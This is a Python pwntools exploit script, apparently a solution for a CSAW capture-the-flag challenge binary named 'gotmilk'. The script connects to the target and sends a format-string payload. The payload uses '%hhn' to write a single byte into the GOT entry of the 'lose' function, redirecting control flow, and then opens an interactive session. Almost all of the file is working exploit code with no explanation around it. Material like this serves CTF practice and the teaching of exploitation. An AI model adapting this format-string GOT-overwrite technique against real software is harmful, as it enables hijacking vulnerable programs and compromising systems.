from pwn import *
context.log_level = 'debug'

TARGET = './gotmilk'
HOST = 'pwn.chal.csaw.io'
PORT = 1004

LHOST = 'localhost'
LPORT = 9000

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libmylib.so"})
# r = remote(HOST, PORT)
r = remote(LHOST, LPORT)

gdb.attach(r, '''
b*0x80486bc
b*0x80486cf
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

target = elf.got['lose'] # 0x804a010
value = 0x89

r.recvuntil('milk?')


payload = '%' + str(value) + 'c%11$hhn'
payload = payload.ljust(0x10, 'A')
payload += p32(target)
# payload += '\x10\x10'
r.sendline(payload)


r.interactive()
r.close()
